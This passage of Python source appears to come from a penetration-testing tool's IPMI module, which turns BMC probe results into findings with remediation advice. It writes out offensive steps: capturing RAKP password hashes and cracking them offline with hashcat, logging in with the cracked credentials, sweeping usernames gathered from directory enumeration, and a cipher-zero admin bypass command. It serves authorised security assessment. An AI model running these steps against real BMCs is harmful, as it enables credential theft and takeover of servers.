            sweep = pr.get("rakp_sweep") or {}
            hashes = sweep.get("hashes") or []
            if hashes:
                # Group captures by hashcat mode so the operator sees which
                # loot file(s) got written.
                # Avoid `for h in hashes` — `h` is the outer host loop var and
                # rebinding it here breaks `h.ip` in the finding text below.
                by_mode: dict[int, list[str]] = {}
                for _hash_entry in hashes:
                    by_mode.setdefault(_hash_entry["mode"], []).append(
                        _hash_entry["user"])
                mode_txt = "; ".join(
                    f"-m {m} for {len(users)} user(s) ({', '.join(sorted(set(users)))})"
                    for m, users in sorted(by_mode.items()))
                first_mode = min(by_mode)
                meta = pr.get("_rakp_meta") or {}
                known = meta.get("known") or {}
                total_known = known.get("total_known") or 0
                sources = known.get("sources") or []
                users_probed = len(meta.get("users") or []) or "the BMC defaults"
                context = (
                    f"\n\nUser list: probed {users_probed} account(s). "
                    f"Engagement knows {total_known} user(s) total"
                    + (f" from {', '.join(sources)}" if sources else "")
                    + (" — sweep was CAPPED (pass --rakp-users to include the rest)"
                       if known.get("capped") else "")
                    + "." if total_known else "")
                out.append(_finding(
                    "high",
                    "IPMI RAKP hashes captured (RMCP+ password HMAC is offline-crackable)",
                    tgt,
                    f"RMCP+ Open Session + RAKP1 exchange(s) with the BMC returned "
                    f"{len(hashes)} crackable HMAC(s): {mode_txt}. The HMAC in "
                    f"RAKP Message 2 is computed with the target user's password "
                    f"as the key. ANY IPMI 2.0 BMC leaks this to ANY client that "
                    f"starts the exchange — design of the protocol, not a "
                    f"misconfiguration. Recce wrote the captured lines to "
                    f"loot/ipmi*.hash." + context,
                    f"hashcat -m {first_mode} loot/ipmi.hash wordlist.txt   "
                    f"# then: ipmitool -H {h.ip} -U <user> -P <cracked> user list",
                    "There is no protocol-level fix — restrict IPMI to a dedicated "
                    "management network and enforce a password policy strong "
                    "enough that offline cracking is infeasible (16+ char "
                    "high-entropy).",
                    ["CWE-916", "CWE-522"], kind="ipmi_rakp_hash"))

                # Username enumeration: some BMCs answer differently for valid
                # vs invalid users, so the sweep's success/failure map tells
                # the tester which accounts actually exist. That is a separate,
                # lower-severity finding on top of the crackable-hash one.
                if sweep.get("distinguishes_users") and sweep.get("existing_users"):
                    valid = sweep["existing_users"]
                    out.append(_finding(
                        "medium",
                        "IPMI username enumeration via RAKP status codes", tgt,
                        f"The BMC answered RAKP1 for some usernames and REFUSED "
                        f"others with 'invalid role' — a scanner can distinguish "
                        f"valid accounts from invalid ones. Valid users named by "
                        f"the sweep: {', '.join(valid)}. Combined with the "
                        f"captured RAKP hash for each, an attacker can focus "
                        f"crack effort on the accounts that actually exist.",
                        f"ipmitool -H {h.ip} -I lanplus user list   "
                        "# for the credentialed cross-check",
                        "Configure the BMC to return the same reply for existing "
                        "and missing users (vendor-specific: iDRAC 'lockdown', "
                        "iLO 'user account privacy'). Restricting IPMI to the "
                        "management network remains the primary control.",
                        ["CWE-204", "CWE-200"], kind="ipmi_user_enum"))

            # --- Auth Status posture bits (parsed but previously silent) ---
            # Bit 4: per-message auth disabled — once a session is open, any
            # datagram inside it (spoofable source IP + guessed session ID)
            # is accepted without a MAC. Meaningful even without cipher-0.
            if pr.get("per_msg_auth_disabled"):
                out.append(_finding(
                    "high",
                    "IPMI per-message authentication disabled", tgt,
                    "Auth Status byte (bit 4) reports 'per-message auth "
                    "disabled'. Individual IPMI messages inside an established "
                    "session are accepted without a MAC — an on-path attacker "
                    "who observes a legitimate session can inject arbitrary "
                    "commands (power off, mount virtual media, dump SEL).",
                    f"ipmitool -H {h.ip} -I lan channel authcap 14 4",
                    "Re-enable per-message authentication on the BMC channel "
                    "(vendor-specific: ipmitool lan set <chan> auth ADMIN "
                    "MD5,PASSWORD; on iDRAC via racadm set idrac.ipmilan.*).",
                    ["CWE-306", "CWE-345"],
                    kind="ipmi_per_msg_auth_disabled"))
            # Bit 3: user-level auth disabled — user-priv commands take no
            # auth type at all, so sensor reads / SEL dumps / vendor info
            # commands leak with no credential.
            if pr.get("user_level_auth_disabled"):
                out.append(_finding(
                    "high",
                    "IPMI user-level authentication disabled", tgt,
                    "Auth Status byte (bit 3) reports 'user-level auth "
                    "disabled'. Commands issued at USER privilege accept auth "
                    "type NONE — sensor data, event log dumps, and some vendor "
                    "extensions can be queried with no credential at all.",
                    f"ipmitool -H {h.ip} -I lan channel authcap 14 2",
                    "Require authentication at the USER privilege level on the "
                    "BMC channel (vendor-specific channel-authcap setting).",
                    ["CWE-306"],
                    kind="ipmi_userlevel_auth_disabled"))
            # Bit 5: KG (BMC key) set or NOT set. When not set, K_uid
            # collapses to HMAC(password) so any captured RAKP2 (see the
            # ipmi_rakp_hash finding above) is straight-line crackable.
            # Info-level fact — reported so the operator can see it in the
            # report and correlate with any captured RAKP hashes.
            if pr.get("reachable") and not pr.get("kg_set"):
                out.append(_finding(
                    "info",
                    "IPMI BMC key (KG) not configured", tgt,
                    "Auth Status byte (bit 5) reports KG=not-set (the default "
                    "on most rack BMCs). K_uid then reduces to HMAC(password), "
                    "so any captured RAKP2 is crackable with the user password "
                    "as the only unknown. Setting KG adds a second key that "
                    "must be recovered independently.",
                    f"ipmitool -H {h.ip} -I lanplus lan print 1",
                    "Set a strong random KG on each BMC channel (vendor-"
                    "specific: ipmitool lan set <chan> cipher_privs / racadm "
                    "config -g cfgIpmiLan -o cfgIpmiLanEncryptionKey).",
                    ["CWE-1391"],
                    kind="ipmi_kg_key_status"))
            # --- Get Device ID (vendor + firmware fingerprint) --------------
            # Info-level fact so the operator can eyeball the BMC vendor and
            # cross-reference against vendor advisories out-of-band. No CVEs
            # are asserted from a version alone — see the airgap constraint.
            vendor = pr.get("vendor") or ""
            mfg = pr.get("manufacturer_id") or 0
            if vendor or mfg:
                fw = pr.get("firmware_version") or "unknown"
                mfg_txt = f"IANA {mfg}" + (f" ({vendor})" if vendor else "")
                out.append(_finding(
                    "info",
                    f"IPMI BMC identified: {vendor or 'unknown vendor'}"
                    f" firmware {fw}", tgt,
                    f"Get Device ID (App/0x01) returned manufacturer_id="
                    f"{mfg_txt}, product_id={pr.get('product_id',0)}, "
                    f"firmware={fw}. Use this to correlate against the "
                    f"vendor's own security advisories (iDRAC / iLO / "
                    f"Supermicro / MegaRAC) — recce does not embed a CVE "
                    f"database for BMC firmware.",
                    f"ipmitool -H {h.ip} -I lan mc info",
                    "Keep BMC firmware current with the vendor's release "
                    "cadence; restrict IPMI to a dedicated OOB network.",
                    ["CWE-200"], kind="ipmi_device_id"))
            # Always emit an info-level fingerprint so IPMI presence is in the report.
            out.append(_finding(
                "info", "IPMI endpoint reachable", tgt,
                f"IPMI {pr.get('ipmi_version','?')} auth capabilities enumerated: "
                f"types={pr.get('auth_types')} null_user={pr.get('null_user')} "
                f"anonymous={pr.get('anonymous_login')}",
                f"ipmitool -H {h.ip} -I lan channel info",
                "Restrict IPMI to a dedicated management network.",
                [], kind="ipmi_fingerprint"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Enumerate auth capabilities",
         "cmd": f"ipmitool -H {ip} -I lan channel authcap 14 4"},
        {"step": "Cipher-zero admin test (CVE-2013-4786)",
         "cmd": f"ipmitool -I lanplus -C 0 -H {ip} -U root -P '' user list"},
        {"step": "List cipher suites the BMC supports",
         "cmd": f"ipmitool -H {ip} -I lan channel getciphers ipmi 14"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "ipmi", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            rakp_users: list[str] | None = None) -> dict:
    """Analyze IPMI targets. `rakp_users` overrides the RAKP username sweep;
    when None, recce unions the 8 vendor defaults with users learned from AD
    enum / BloodHound / SNMP LanMan / SMB SAMR (see creds.known_users).
    Bounded by a per-scan cap so a BloodHound import of thousands of users
    does not translate into thousands of RAKP round-trips per BMC."""
    from . import svcprobe
    from ..creds.known_users import known_users
    targets = ipmi_targets(hosts)

    # Compute the RAKP user list ONCE per scan, not per host. Cap the extras
    # at 17 so total (8 defaults + 17 known) stays inside a reasonable
    # per-BMC budget of ~50 UDP round-trips (25 users x 2 algs).
    rakp_meta: dict = {"users": [], "known": {"total_known": 0, "capped": False,
                                              "sources": []}}
    if rakp_users:
        rakp_meta["users"] = list(rakp_users)
        rakp_meta["known"] = {"total_known": len(rakp_users), "capped": False,
                              "sources": ["operator-supplied"]}
    else:
        picked = known_users(hosts, cap=17, extras=list(_DEFAULT_RAKP_USERS))
        rakp_meta["users"] = picked["users"]
        rakp_meta["known"] = {"total_known": picked["total_known"],
                              "capped": picked["capped"],
                              "sources": picked["sources"]}

    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets,
                lambda t: probe(t["ip"], t["port"], rakp_users=rakp_meta["users"]),
                budget=budget, progress=progress, state=state):
            if pr:
                # Stash the shared sweep meta on every probe so findings() can
                # surface the "N of M known users tested" and source-list
                # context per host without a separate pipe. Cheap: it's a
                # small dict, shared by reference.
                pr["_rakp_meta"] = rakp_meta
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["cipher_zero"] = pr.get("cipher_zero", False)
                t["anonymous"] = pr.get("anonymous_login", False) or pr.get("null_user", False)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "rakp": rakp_meta,
            "stats": {"targets": len(targets), "findings": len(fs),
                      "rakp_users": len(rakp_meta["users"]),
                      "stopped": state.get("stopped")}}
